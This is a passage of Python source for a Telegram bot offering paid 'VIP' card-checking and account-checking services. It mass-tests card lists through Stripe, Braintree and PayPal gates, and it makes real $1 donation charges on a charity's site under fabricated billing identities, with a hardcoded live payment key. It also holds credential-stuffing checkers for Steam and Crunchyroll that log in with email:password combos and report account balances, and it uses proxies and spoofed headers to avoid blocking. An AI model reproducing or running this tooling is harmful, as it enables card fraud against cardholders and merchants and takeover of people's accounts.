    if gw in ('sa', 'nonsk'):
        return 'approved' in r
    elif gw == 'st':
        return 'charged' in r or 'approved' in r or 'insufficient' in r
    elif gw == 'vbv':
        return '3ds authenticate' in r or 'authenticate_successful' in r or 'attempt_successful' in r
    elif gw == 'pp':
        return 'charge' in r or 'approved' in r
    return False


def _run_file_check(call, gw):
    id = call.from_user.id
    data = _pending_files.get(id)
    if not data:
        bot.answer_callback_query(call.id, "❌ No file found. Please upload again.")
        return
    cards = data['cards']
    chat_id = data['chat_id']
    file_name = data['file_name']
    total = len(cards)
    proxy = get_proxy_dict(id)
    gw_names = {'sa': '⚡ Stripe Auth', 'st': '💳 Stripe Charge',
                'vbv': '🛡️ Braintree VBV', 'pp': '💰 PayPal', 'nonsk': '🔍 Non-SK'}
    gw_label = gw_names.get(gw, gw.upper())
    checked = success = failed = 0
    try:
        stopuser[f'{id}']['status'] = 'start'
    except:
        stopuser[f'{id}'] = {'status': 'start'}
    stop_kb = types.InlineKeyboardMarkup()
    stop_kb.add(types.InlineKeyboardButton("🛑 Stop", callback_data='stop'))
    msg = bot.send_message(
        chat_id,
        f"<b>📂 {gw_label} — File Checker\n"
        f"📄 {file_name} | 💳 {total} cards\n"
        f"⏳ Starting...</b>",
        parse_mode='HTML', reply_markup=stop_kb
    )
    def build_status():
        return (
            f"<b>📂 {gw_label} — File Checker\n"
            f"📄 {file_name}\n"
            f"▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰\n"
            f"📊 {checked}/{total} | ✅ {success} | ❌ {failed}\n"
            f"▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰\n"
            f"⌤ YADISTAN - 🍀</b>"
        )
    last_edit = [time.time()]
    for cc in cards:
        if stopuser.get(f'{id}', {}).get('status') == 'stop':
            try:
                bot.edit_message_text(chat_id=chat_id, message_id=msg.message_id,
                                      text=build_status().replace("⌤", "🛑 Stopped | ⌤"),
                                      parse_mode='HTML')
            except:
                pass
            return
        if gw == 'sa' or gw == 'nonsk':
            result = stripe_auth(cc, proxy)
        elif gw == 'st':
            result = stripe_charge(cc, proxy)
        elif gw == 'vbv':
            result = passed_gate(cc, proxy)
        elif gw == 'pp':
            result = paypal_gate(cc, get_user_amount(id), proxy)
        else:
            result = stripe_auth(cc, proxy)
        checked += 1
        if _is_success(result, gw):
            success += 1
            try:
                bot.send_message(
                    chat_id,
                    f"<b>✅ APPROVED!\n"
                    f"━━━━━━━━━━━━━━━━━━━━\n"
                    f"💳 Card   : <code>{cc}</code>\n"
                    f"📡 Result : {result}\n"
                    f"🌐 Gate   : {gw_label}\n"
                    f"━━━━━━━━━━━━━━━━━━━━\n"
                    f"⌤ YADISTAN - 🍀</b>",
                    parse_mode='HTML'
                )
            except:
                pass
        else:
            failed += 1
        if time.time() - last_edit[0] > 2:
            try:
                bot.edit_message_text(chat_id=chat_id, message_id=msg.message_id,
                                      text=build_status(), parse_mode='HTML',
                                      reply_markup=stop_kb)
                last_edit[0] = time.time()
            except:
                pass
    try:
        bot.edit_message_text(chat_id=chat_id, message_id=msg.message_id,
                              text=build_status().replace("⌤", "✅ Done! | ⌤"),
                              parse_mode='HTML')
    except:
        pass
    del _pending_files[id]


@bot.callback_query_handler(func=lambda c: c.data.startswith('fchk_'))
def file_check_callback(call):
    gw = call.data.replace('fchk_', '')
    bot.answer_callback_query(call.id, "⚡ Starting...")
    try:
        bot.edit_message_reply_markup(call.message.chat.id, call.message.message_id, reply_markup=None)
    except:
        pass
    threading.Thread(target=_run_file_check, args=(call, gw)).start()

# ===============================================================

# ================== /addbandc & /listbandc — Bandc Account Management (Admin) ==================

@bot.message_handler(commands=["addbandc"])
def addbandc_command(message):
    uid = message.from_user.id
    if uid != admin:
        bot.reply_to(message, "<b>❌ Admin only.</b>", parse_mode='HTML')
        return

    usage = (
        "<b>➕ Add bandc.com Account\n"
        "━━━━━━━━━━━━━━━━\n"
        "Format (any separator works):\n"
        "<code>/addbandc email@gmail.com:Password123</code>\n"
        "<code>/addbandc email@gmail.com|Password123</code>\n\n"
        "Multiple (inline):\n"
        "<code>/addbandc\n"
        "email1@gmail.com:Pass1\n"
        "email2@gmail.com:Pass2</code>\n\n"
        "Reply method:\n"
        "Send list as a message, then reply to it with /addbandc</b>"
    )

    def _parse_lines(raw_lines):
        result = []
        for line in raw_lines:
            line = line.strip()
            if not line or '@' not in line:
                continue
            sep = None
            if '|' in line:
                sep = '|'
            elif ':' in line:
                sep = ':'
            if sep is None:
                continue
            parts = line.split(sep, 1)
            if len(parts) == 2 and '@' in parts[0] and parts[1].strip():
                email = parts[0].strip()
                password = parts[1].strip()
                result.append({'email': email, 'password': password, 'username': email.split('@')[0]})
        return result

    entries = []

    # If user replied to another message, parse that message's text
    if message.reply_to_message and message.reply_to_message.text:
        entries = _parse_lines(message.reply_to_message.text.strip().split('\n'))

    # Also parse current message (after removing command)
    text = message.text.strip()
    lines = text.split('\n')
    first = lines[0].replace('/addbandc', '').strip()
    if first:
        lines[0] = first
    else:
        lines = lines[1:]
    entries += _parse_lines(lines)

    # Deduplicate by email
    seen = set()
    unique_entries = []
    for e in entries:
        if e['email'] not in seen:
            seen.add(e['email'])
            unique_entries.append(e)
    entries = unique_entries

    if not entries:
        bot.reply_to(message, usage, parse_mode='HTML')
        return

    added = []
    dupes = []
    conn = db._get_conn()

    for e in entries:
        try:
            conn.execute(
                "INSERT INTO bandc_accounts (email, password, username) VALUES (?, ?, ?)",
                (e['email'], e['password'], e['username'])
            )
            conn.commit()
            added.append(e['email'])
        except Exception:
            dupes.append(e['email'])

    total = conn.execute("SELECT COUNT(*) FROM bandc_accounts").fetchone()[0]

    resp = f"<b>✅ {len(added)} account(s) added to bandc pool\n"
    if added:
        resp += "━━━━━━━━━━━━━━━━\n" + "\n".join(f"  ✅ {e}" for e in added) + "\n"
    if dupes:
        resp += "━━━━━━━━━━━━━━━━\n" + "\n".join(f"  ⚠️ Already exists: {e}" for e in dupes) + "\n"
    resp += f"━━━━━━━━━━━━━━━━\n📊 Total pool: {total} accounts\n💾 Saved to database ✅</b>"
    bot.reply_to(message, resp, parse_mode='HTML')


@bot.message_handler(commands=["listbandc"])
def listbandc_command(message):
    uid = message.from_user.id
    if uid != admin:
        bot.reply_to(message, "<b>❌ Admin only.</b>", parse_mode='HTML')
        return

    accounts = _b3_load_accounts()
    if not accounts:
        bot.reply_to(message,
            "<b>📋 Bandc Account Pool\n"
            "━━━━━━━━━━━━━━━━\n"
            "❌ No accounts found!\n\n"
            "Add via: /addbandc email:password</b>", parse_mode='HTML')
        return

    lines = "\n".join(f"  {i+1}. <code>{a['email']}</code>" for i, a in enumerate(accounts))
    bot.reply_to(message,
        f"<b>📋 Bandc Account Pool ({len(accounts)} accounts)\n"
        f"━━━━━━━━━━━━━━━━\n"
        f"{lines}\n"
        f"━━━━━━━━━━━━━━━━\n"
        f"🗑️ To clear all: /clearbandc</b>", parse_mode='HTML')


@bot.message_handler(commands=["clearbandc"])
def clearbandc_command(message):
    uid = message.from_user.id
    if uid != admin:
        bot.reply_to(message, "<b>❌ Admin only.</b>", parse_mode='HTML')
        return
    try:
        conn = db._get_conn()
        conn.execute("DELETE FROM bandc_accounts")
        conn.commit()
    except Exception as e:
        bot.reply_to(message, f"<b>❌ DB error: {e}</b>", parse_mode='HTML')
        return
    bot.reply_to(message, "<b>🗑️ All bandc accounts cleared from database.</b>", parse_mode='HTML')


# ================== /br — Bravehound $1 Charge Checker ==================

class _BravehoundChecker:
    def __init__(self, card_data: str, proxy=None):
        parts = card_data.split('|')
        self.card_number = parts[0].strip()
        self.exp_month   = parts[1].strip()
        self.exp_year    = parts[2].strip()
        self.cvc         = parts[3].strip()
        self.proxy       = proxy
        self.session     = requests.Session()
        self._setup_proxy()
        self.address     = self._gen_address()
        self.form_hash   = None
        self.pm_id       = None

    _LOCATIONS = [
        {"city": "New York",     "state": "NY", "zip": "10001"},
        {"city": "Los Angeles",  "state": "CA", "zip": "90001"},
        {"city": "Chicago",      "state": "IL", "zip": "60601"},
        {"city": "Houston",      "state": "TX", "zip": "77001"},
        {"city": "Phoenix",      "state": "AZ", "zip": "85001"},
        {"city": "Dallas",       "state": "TX", "zip": "75201"},
        {"city": "Austin",       "state": "TX", "zip": "78701"},
    ]
    _FIRST = ["James","Mary","John","Patricia","Robert","Jennifer","Michael","Linda","William","Elizabeth"]
    _LAST  = ["Smith","Johnson","Williams","Brown","Jones","Garcia","Miller","Davis","Rodriguez","Martinez"]
    _STREETS = ["Main St","Oak Ave","Maple Dr","Cedar Ln","Pine St","Elm St","Washington Ave","Park Ave"]

    _BASE_HEADERS = {
        'User-Agent':       'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
        'Accept-Language':  'en-US,en;q=0.9',
        'sec-ch-ua':        '"Chromium";v="124", "Google Chrome";v="124", "Not-A.Brand";v="99"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
    }

    def _setup_proxy(self):
        if isinstance(self.proxy, dict):
            self.session.proxies = self.proxy
        elif isinstance(self.proxy, str) and self.proxy:
            self.session.proxies = {"http": self.proxy, "https": self.proxy}

    def _gen_address(self):
        loc = random.choice(self._LOCATIONS)
        fn  = random.choice(self._FIRST)
        ln  = random.choice(self._LAST)
        return {
            "first_name": fn, "last_name": ln,
            "address":    f"{random.randint(100,9999)} {random.choice(self._STREETS)}",
            "city":       loc["city"], "state": loc["state"], "zip": loc["zip"],
            "email":      f"{fn.lower()}{random.randint(1,999)}@gmail.com"
        }

    def get_form_hash(self):
        # Pehle donation page visit karo — PHPSESSID cookie milti hai (403 avoid)
        self.session.get(
            "https://www.bravehound.co.uk/donation/",
            headers={**self._BASE_HEADERS,
                     'Accept': 'text/html,application/xhtml+xml,*/*;q=0.8',
                     'sec-fetch-dest': 'document',
                     'sec-fetch-mode': 'navigate',
                     'sec-fetch-site': 'none'},
            timeout=20
        )
        r = self.session.post(
            "https://www.bravehound.co.uk/wp-admin/admin-ajax.php",
            data={'action': "give_donation_form_reset_all_nonce", 'give_form_id': "13302"},
            headers={**self._BASE_HEADERS,
                     'Accept':          'application/json, text/javascript, */*; q=0.01',
                     'x-requested-with': 'XMLHttpRequest',
                     'origin':           'https://www.bravehound.co.uk',
                     'referer':          'https://www.bravehound.co.uk/donation/',
                     'sec-fetch-dest':   'empty',
                     'sec-fetch-mode':   'cors',
                     'sec-fetch-site':   'same-origin'},
            timeout=20
        )
        if r.status_code == 403:
            raise Exception(f"Site blocked (403) — use proxy")
        d = r.json()
        self.form_hash = d['data']['give_form_hash']
        return self.form_hash

    def create_payment_method(self):
        r = self.session.post(
            "https://api.stripe.com/v1/payment_methods",
            data={
                'type': "card",
                'billing_details[name]':  f"{self.address['first_name']} {self.address['last_name']}",
                'billing_details[email]': self.address['email'],
                'card[number]':           self.card_number,
                'card[cvc]':              self.cvc,
                'card[exp_month]':        self.exp_month,
                'card[exp_year]':         self.exp_year[-2:],
                'guid':                   "c2d15411-4ea6-4412-96f9-5964b19feacc9a03e0",
                'muid':                   "2cbebced-2e78-43c8-8df0-d77c88f32d7effd1d6",
                'sid':                    "515d1b26-d906-4b1d-a218-e9cb37dbceebeed15b",
                'payment_user_agent':     "stripe.js/668d00c08a; stripe-js-v3/668d00c08a; split-card-element",
                'referrer':               "https://www.bravehound.co.uk",
                'time_on_page':           str(random.randint(30000, 50000)),
                'client_attribution_metadata[client_session_id]':         "63059f23-5d3b-4e7b-b77f-7c5d2fc5630d",
                'client_attribution_metadata[merchant_integration_source]': "elements",
                'client_attribution_metadata[merchant_integration_subtype]': "split-card-element",
                'client_attribution_metadata[merchant_integration_version]': "2017",
                'key':              "pk_live_SMtnnvlq4TpJelMdklNha8iD",
                '_stripe_account':  "acct_1GZhGGEfZQ9gHa50",
            },
            headers={
                'User-Agent': "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36",
                'Accept':     "application/json",
                'origin':     "https://js.stripe.com",
                'referer':    "https://js.stripe.com/",
            }, timeout=20
        )
        self.pm_id = r.json()['id']
        return self.pm_id

    def submit_donation(self):
        r = self.session.post(
            "https://www.bravehound.co.uk/donation/",
            params={'payment-mode': "stripe", 'form-id': "13302"},
            data={
                'give-honeypot':          "",
                'give-form-id-prefix':    "13302-1",
                'give-form-id':           "13302",
                'give-form-title':        "Bravehound Donations",
                'give-current-url':       "https://www.bravehound.co.uk/donation/",
                'give-form-url':          "https://www.bravehound.co.uk/donation/",
                'give-form-minimum':      "1.00",
                'give-form-maximum':      "999999.99",
                'give-form-hash':         self.form_hash,
                'give-price-id':          "custom",
                'give-amount':            "1.00",
                'give_stripe_payment_method': self.pm_id,
                'payment-mode':           "stripe",
                'give_first':             self.address['first_name'],
                'give_last':              self.address['last_name'],
                'give_email':             self.address['email'],
                'card_name':              f"{self.address['first_name']} {self.address['last_name']}",
                'give_gift_check_is_billing_address': "yes",
                'give_gift_aid_billing_country':      "US",
                'give_gift_aid_card_address':         self.address['address'],
                'give_gift_aid_card_city':            self.address['city'],
                'give_gift_aid_card_state':           self.address['state'],
                'give_gift_aid_card_zip':             self.address['zip'],
                'give_action':  "purchase",
                'give-gateway': "stripe",
            },
            headers={
                'User-Agent':         "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36",
                'Accept':             "text/html,application/xhtml+xml,*/*;q=0.8",
                'origin':             "https://www.bravehound.co.uk",
                'referer':            "https://www.bravehound.co.uk/donation/?form-id=13302&payment-mode=stripe",
                'upgrade-insecure-requests': "1",
            }, timeout=25, allow_redirects=True
        )
        return self._parse(r.text)

    def _parse(self, html):
        err = re.search(r'<p>.*?<strong>Error</strong>:(.*?)<br', html, re.DOTALL)
        if err:
            return {"status": "declined", "message": err.group(1).strip()[:120]}
        if re.search(r'(thank\s?you|successfully|succeeded|donation.*received)', html, re.I):
            return {"status": "charged", "message": "Charged $1.00"}
        if re.search(r'(card.*declined|do not honor|insufficient)', html, re.I):
            return {"status": "declined", "message": "Card Declined"}
        return {"status": "unknown", "message": "Unknown Response"}

    def run(self):
        self.get_form_hash()
        self.create_payment_method()
        time.sleep(random.uniform(1, 2))
        return self.submit_donation()


def _br_check(card: str, proxy=None) -> dict:
    try:
        bot_obj = _BravehoundChecker(card, proxy=proxy)
        result  = bot_obj.run()
        return result
    except Exception as e:
        return {"status": "error", "message": str(e)[:100]}


@bot.message_handler(commands=["br"])
def br_command(message):
    def my_function():
        uid = message.from_user.id
        with open("data.json", 'r', encoding='utf-8') as f:
            jd = json.load(f)
        try:
            BL = jd[str(uid)]['plan']
        except:
            BL = '𝗙𝗥𝗘𝗘'

        if BL == '𝗙𝗥𝗘𝗘' and uid != admin:
            bot.reply_to(message, "<b>❌ 𝗧𝗵𝗶𝘀 𝗰𝗼𝗺𝗺𝗮𝗻𝗱 𝗶𝘀 𝗼𝗻𝗹𝘆 𝗳𝗼𝗿 𝗩𝗜𝗣 𝘂𝘀𝗲𝗿𝘀.</b>", parse_mode='HTML')
            return

        allowed, wait = check_rate_limit(uid, BL)
        if not allowed:
            bot.reply_to(message, f"<b>⏱️ 𝗪𝗮𝗶𝘁 {wait}𝘀 𝗯𝗲𝗳𝗼𝗿𝗲 𝗻𝗲𝘅𝘁 𝗰𝗵𝗲𝗰𝗸.</b>", parse_mode='HTML')
            return

        cards = _get_cards_from_message(message)
        if not cards:
            bot.reply_to(message,
                "<b>🐾 𝗕𝗿𝗮𝘃𝗲𝗵𝗼𝘂𝗻𝗱 $𝟭 𝗖𝗵𝗮𝗿𝗴𝗲 𝗖𝗵𝗲𝗰𝗸𝗲𝗿\n"
                "━━━━━━━━━━━━━━━━\n"
                "💡 <i>Real $1 charge via bravehound.co.uk</i>\n\n"
                "📌 Single card:\n"
                "<code>/br 4111111111111111|12|26|123</code>\n\n"
                "📌 Multi card (unlimited):\n"
                "<code>/br\n"
                "4111111111111111|12|26|123\n"
                "5218071175156668|02|26|574</code>\n\n"
                "📊 Results:\n"
                "✅ Charged $1  ❌ Declined  ⚠️ Unknown\n"
                "━━━━━━━━━━━━━━━━\n"
                "⚠️ <i>VIP only · Real charge on card</i></b>",
                parse_mode='HTML')
            return

        if len(cards) > 999999999:
            bot.reply_to(message, "<b>❌ Too many cards.</b>", parse_mode='HTML')
            return

        proxy = get_proxy_dict(uid)

        # ── Single card ──────────────────────────────────────────
        if len(cards) == 1:
            card = cards[0]
            bin_num = card.replace('|', '')[:6]
            bin_info, bank, country, country_code = get_bin_info(bin_num)
            log_command(message, query_type='gateway', gateway='bravehound')

            msg = bot.reply_to(message,
                f"<b>⏳ Checking [Bravehound $1 Charge]...\n"
                f"💳 Card: <code>{card}</code></b>", parse_mode='HTML')

            t0     = time.time()
            result = _br_check(card, proxy=proxy)
            elapsed = round(time.time() - t0, 2)

            st  = result.get("status", "").lower()
            msg_txt = result.get("message", "")

            if st == "charged":
                em, word = "✅", "Charged $1.00"
            elif st == "declined":
                em, word = "❌", "Declined"
            elif st == "error":
                em, word = "🔴", "Error"
            else:
                em, word = "⚠️", "Unknown"

            log_card_check(uid, card, 'bravehound', f"{st} | {msg_txt}")

            kb = types.InlineKeyboardMarkup()
            kb.add(types.InlineKeyboardButton(text="YADISTAN - 🍀", url="https://t.me/yadistan"))

            bot.edit_message_text(
                chat_id=message.chat.id, message_id=msg.message_id,
                text=(
                    f"<b>{em} {word}  ❯  <code>{card}</code>\n"
                    f"━━━━━━━━━━━━━━━━\n"
                    f"🐾 Gate: Bravehound $1 Charge\n"
                    f"💬 Msg: {msg_txt}\n"
                    f"━━━━━━━━━━━━━━━━\n"
                    f"🏦 BIN: {bin_num}  •  {bin_info}\n"
                    f"🏛️ Bank: {bank}\n"
                    f"🌍 Country: {country} {country_code}\n"
                    f"━━━━━━━━━━━━━━━━\n"
                    f"⏱️ Time: {elapsed}s\n"
                    f"[⌤] Bot by @yadistan</b>"
                ),
                parse_mode='HTML', reply_markup=kb)
            return

        # ── Multi card ───────────────────────────────────────────
        total = len(cards)
        charged = declined = err = checked = 0
        hits = []
        results_lines = []

        stop_kb = types.InlineKeyboardMarkup()
        stop_kb.add(types.InlineKeyboardButton(text="🛑 Stop", callback_data='stop'))
        try:
            stopuser[f'{uid}']['status'] = 'start'
        except:
            stopuser[f'{uid}'] = {'status': 'start'}

        log_command(message, query_type='gateway', gateway='bravehound_mass')

        msg = bot.reply_to(message,
            f"<b>🐾 Bravehound $1 Charge — Mass Check\n"
            f"━━━━━━━━━━━━━━━━\n"
            f"📋 Total: {total} cards\n"
            f"⏳ Starting...</b>",
            parse_mode='HTML', reply_markup=stop_kb)

        def _build_msg(status="⏳ Checking..."):
            hdr = (
                f"<b>🐾 Bravehound $1 | {status}\n"
                f"━━━━━━━━━━━━━━━━\n"
                f"📊 {checked}/{total} | ✅ {charged} | ❌ {declined} | 🔴 {err}\n"
                f"━━━━━━━━━━━━━━━━\n"
            )
            body = "\n".join(results_lines[-10:])
            footer = ""
            if hits:
                footer = "\n━━━━━━━━━━━━━━━━\n🎯 𝗛𝗜𝗧𝗦:\n" + "\n".join(
                    f"✅ <code>{c}</code> | {r.get('message','')}" for c, r in hits[-5:]
                )
            return hdr + body + footer + "\n━━━━━━━━━━━━━━━━\n[⌤] Bot by @yadistan</b>"

        for card in cards:
            if stopuser.get(f'{uid}', {}).get('status') == 'stop':
                try:
                    bot.edit_message_text(_build_msg("🛑 STOPPED"), message.chat.id, msg.message_id, parse_mode='HTML')
                except:
                    pass
                return

            card = card.strip()
            result = _br_check(card, proxy=proxy)
            checked += 1
            st = result.get("status", "").lower()
            mt = result.get("message", "")

            if st == "charged":
                em, word = "✅", "Charged"
                charged += 1
                hits.append((card, result))
            elif st == "declined":
                em, word = "❌", "Declined"
                declined += 1
            else:
                em, word = "🔴", "Error"
                err += 1

            log_card_check(uid, card, 'bravehound', f"{st} | {mt}")
            results_lines.append(f"{em} <b>{word}</b>  ❯  <code>{card}</code>")

            if checked % 3 == 0 or checked == total:
                try:
                    bot.edit_message_text(_build_msg(), message.chat.id, msg.message_id,
                                          parse_mode='HTML', reply_markup=stop_kb)
                except:
                    pass
            time.sleep(random.uniform(2, 4))

        try:
            bot.edit_message_text(_build_msg("✅ Done"), message.chat.id, msg.message_id, parse_mode='HTML')
        except:
            pass

    threading.Thread(target=my_function).start()


# ╔══════════════════════════════════════════════════════════════════════════════╗
# ║          ACCOUNT CHECKERS — Steam / Crunchyroll / Hotmail / Site Gate       ║
# ╚══════════════════════════════════════════════════════════════════════════════╝

import base64 as _b64
import uuid   as _uuid_mod
from concurrent.futures import ThreadPoolExecutor, as_completed

# ─────────────────────────── STEAM CHECKER ────────────────────────────────────

_STEAM_RSA_URL   = "https://steamcommunity.com/login/getrsakey/"
_STEAM_LOGIN_URL = "https://steamcommunity.com/login/dologin/"
_STEAM_ACCT_URL  = "https://store.steampowered.com/account/"

def _steam_encrypt_pw(mod_hex: str, exp_hex: str, password: str):
    """RSA-encrypt Steam password with PKCS1_v1_5, returns url-safe b64 or None."""
    try:
        from Crypto.PublicKey import RSA as _SRSA
        from Crypto.Cipher   import PKCS1_v1_5 as _SPKCS
        from urllib.parse    import quote_plus as _qp
        n   = int(mod_hex, 16)
        e   = int(exp_hex, 16)
        pub = _SRSA.construct((n, e))
        enc = _SPKCS.new(pub).encrypt(password.encode())
        return _qp(_b64.b64encode(enc).decode())
    except ImportError:
        return None
    except Exception:
        return None

def _steam_check_one(email: str, password: str, proxy: str = None) -> dict:
    """Check single Steam account. Returns dict with status/info."""
    _UA_STEAM = (
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
        "AppleWebKit/537.36 (KHTML, like Gecko) "
        "Chrome/120.0.0.0 Safari/537.36"
    )
    sess    = requests.Session()
    proxies = {"http": proxy, "https": proxy} if proxy else None
    headers = {
        "User-Agent":      _UA_STEAM,
        "Accept":          "application/json, text/plain, */*",
        "Accept-Language": "en-US,en;q=0.9",
        "Referer":         "https://steamcommunity.com/login/home/",
        "Origin":          "https://steamcommunity.com",
        "X-Requested-With":"XMLHttpRequest",
    }
    try:
        # Step 1: get RSA key
        r1 = sess.post(
            _STEAM_RSA_URL,
            data    = {"donotcache": int(time.time() * 1000), "username": email},
            headers = headers,
            proxies = proxies,
            timeout = 20,
        )
        j1 = r1.json()
        if not j1.get("success"):
            return {"status": "bad", "msg": "RSA fetch failed / bad username"}

        enc_pw = _steam_encrypt_pw(j1["publickey_mod"], j1["publickey_exp"], password)
        if enc_pw is None:
            return {"status": "error", "msg": "pycryptodome not installed"}

        # Step 2: do login
        r2 = sess.post(
            _STEAM_LOGIN_URL,
            data = {
                "donotcache":       int(time.time() * 1000),
                "password":         enc_pw,
                "username":         email,
                "twofactorcode":    "",
                "emailauth":        "",
                "loginfriendlyname":"",
                "captchagid":       "-1",
                "captcha_text":     "",
                "emailsteamid":     "",
                "rsatimestamp":     j1.get("timestamp",""),
                "remember_login":   "false",
            },
            headers = headers,
            proxies = proxies,
            timeout = 20,
        )
        j2 = r2.json()

        if j2.get("requires_twofactor"):
            return {"status": "2fa", "msg": "Two-factor auth required", "email": email}
        if j2.get("emailauth_needed"):
            return {"status": "2fa", "msg": "Email auth needed", "email": email}
        if not j2.get("login_complete"):
            reason = j2.get("message", "Invalid credentials")
            return {"status": "bad", "msg": reason}

        # Step 3: get account info
        cookies = sess.cookies.get_dict()
        r3      = sess.get(_STEAM_ACCT_URL, headers=headers, proxies=proxies, timeout=20)
        html3   = r3.text

        # parse email shown on page
        email_found = email
        country = balance = game = ""
        try:
            import re as _re_st
            from bs4 import BeautifulSoup as _BS
            soup = _BS(html3, "html.parser")
            # Balance
            b_div = soup.find("div", class_="accountData price")
            if b_div:
                balance = b_div.get_text(strip=True)
            # Country
            spans = soup.find_all("span", class_="account_data_field")
            for sp in spans:
                t = sp.get_text(strip=True)
                if t and "@" not in t and len(t) > 1:
                    country = t
                    break
            # Top game (optional)
            g_tag = _re_st.search(r'"strGameName"\s*:\s*"([^"]+)"', html3)
            if g_tag:
                game = g_tag.group(1)
        except Exception:
            pass

        if not balance:
            balance = "$0.00"

        _status = "hit" if balance and balance != "$0.00" else "free"
        return {
            "status":  _status,
            "msg":     "Hit (Custom)" if _status == "hit" else "Hit (Free/Empty)",
            "email":   email_found,
            "country": country or "N/A",
            "balance": balance,
            "game":    game or "N/A",
        }

    except requests.exceptions.Timeout:
        return {"status": "error", "msg": "Timeout"}
    except Exception as _ex:
        return {"status": "error", "msg": str(_ex)[:120]}


def _steam_fmt_result(r: dict, combo: str) -> str:
    s = r["status"]
    if s in ("hit", "free"):
        ico = "💰" if s == "hit" else "🆓"
        lbl = "HIT (Custom)" if s == "hit" else "HIT (Free)"
        return (
            f"{ico} <b>{lbl}</b>\n"
            f"📧 <code>{combo}</code>\n"
            f"🌍 Country : <b>{r.get('country','N/A')}</b>\n"
            f"💵 Balance : <b>{r.get('balance','$0.00')}</b>\n"
            f"🎮 Game    : <b>{r.get('game','N/A')}</b>"
        )
    elif s == "2fa":
        return f"🔐 <b>2FA Required</b>\n📧 <code>{combo}</code>"
    elif s == "bad":
        return f"❌ <b>Bad</b> | <code>{combo}</code> — {r.get('msg','')}"
    else:
        return f"⚠️ <b>Error</b> | <code>{combo}</code> — {r.get('msg','')}"


@bot.message_handler(commands=['steam'])
def cmd_steam(message):
    uid  = message.from_user.id
    name = message.from_user.first_name or "User"
    text = message.text or ""

    combos_raw = [
        l.strip() for l in text.split("\n")[1:] if ":" in l.strip()
    ]
    # Also allow single on same line: /steam email:pass
    parts = text.split(None, 1)
    if len(parts) > 1 and ":" in parts[1] and "\n" not in parts[1]:
        combos_raw = [parts[1].strip()]

    if not combos_raw:
        bot.reply_to(message,
            "<b>🎮 Steam Account Checker\n\n"
            "Single:\n<code>/steam email:password</code>\n\n"
            "Mass:\n<code>/steam\n"
            "email1:pass1\n"
            "email2:pass2</code></b>",
            parse_mode='HTML')
        return

    if len(combos_raw) == 1:
        wm = bot.reply_to(message, "<b>🎮 Steam | ⏳ Checking...</b>", parse_mode='HTML')
        combo = combos_raw[0]
        em, pw = combo.split(":", 1)
        r = _steam_check_one(em.strip(), pw.strip())
        bot.edit_message_text(
            f"<b>🎮 Steam Checker\n\n{_steam_fmt_result(r, combo)}</b>\n\n"
            f"<i>⚙️ by @YadistanBot</i>",
            chat_id    = message.chat.id,
            message_id = wm.message_id,
            parse_mode = 'HTML'
        )
        return

    # Mass mode
    total  = len(combos_raw)
    hits   = free_ct = bad_ct = err_ct = 0
    wm     = bot.reply_to(message,
        f"<b>🎮 Steam Mass Check | 0/{total}\n⏳ Starting...</b>", parse_mode='HTML')
    results = []

    def _do(combo):
        try:
            em, pw = combo.split(":", 1)
            return combo, _steam_check_one(em.strip(), pw.strip())
        except Exception as ex:
            return combo, {"status": "error", "msg": str(ex)}

    with ThreadPoolExecutor(max_workers=4) as pool:
        futs = {pool.submit(_do, c): c for c in combos_raw}
        done = 0
        for fut in as_completed(futs):
            combo, r = fut.result()
            done += 1
            s = r["status"]
            if s == "hit":   hits   += 1
            elif s == "free": free_ct += 1
            elif s == "bad":  bad_ct  += 1
            else:             err_ct  += 1
            results.append(_steam_fmt_result(r, combo))
            if done % 5 == 0 or done == total:
                try:
                    bot.edit_message_text(
                        f"<b>🎮 Steam Mass | {done}/{total}\n"
                        f"💰 Custom: {hits}  🆓 Free: {free_ct}  "
                        f"❌ Bad: {bad_ct}  ⚠️ Err: {err_ct}</b>",
                        chat_id    = message.chat.id,
                        message_id = wm.message_id,
                        parse_mode = 'HTML'
                    )
                except Exception:
                    pass

    summary = (
        f"<b>🎮 Steam Mass — Done ✅\n\n"
        f"📊 Total   : {total}\n"
        f"💰 Custom  : {hits}\n"
        f"🆓 Free    : {free_ct}\n"
        f"❌ Bad     : {bad_ct}\n"
        f"⚠️ Errors  : {err_ct}</b>"
    )
    try:
        bot.edit_message_text(summary, chat_id=message.chat.id,
                              message_id=wm.message_id, parse_mode='HTML')
    except Exception:
        pass

    hit_lines = [r for r in results if r.startswith("💰") or r.startswith("🆓")]
    if hit_lines:
        chunk = "\n\n".join(hit_lines)
        for i in range(0, len(chunk), 4000):
            bot.send_message(message.chat.id,
                f"<b>🎮 Steam Hits:\n\n{chunk[i:i+4000]}</b>",
                parse_mode='HTML')


# ─────────────────────────── CRUNCHYROLL CHECKER ──────────────────────────────

_CROLL_TOKEN_URL = "https://beta-api.crunchyroll.com/auth/v1/token"
_CROLL_ME_URL    = "https://beta-api.crunchyroll.com/accounts/v1/me"
_CROLL_MULTI_URL = "https://beta-api.crunchyroll.com/accounts/v1/me/multiprofile"
_CROLL_CLIENT_ID = "ajcylfwdtjjtq7qpgks3"
_CROLL_CLIENT_SK = "oKoU8DMZW7SAaQiGzUEdTQG4IimkL8I_"
_CROLL_UAS = [
    "crunchyroll/3.74.2 Android/10 okhttp/4.12.0",
    "crunchyroll/3.74.1 Android/11 okhttp/4.12.0",
    "crunchyroll/3.73.0 Android/9 okhttp/4.11.0",
]

def _croll_check_one(email: str, password: str) -> dict:
    from urllib.parse import quote as _q
    ua   = random.choice(_CROLL_UAS)
    guid = str(_uuid_mod.uuid4())
    em   = _q(email,    safe='')
    pw   = _q(password, safe='')
    hdrs1 = {
        "host":                       "beta-api.crunchyroll.com",
        "content-type":               "application/x-www-form-urlencoded",
        "accept-encoding":            "gzip",
        "user-agent":                 ua,
        "x-datadog-sampling-priority":"0",
    }
    payload1 = (
        f"grant_type=password&username={em}&password={pw}"
        f"&scope=offline_access"
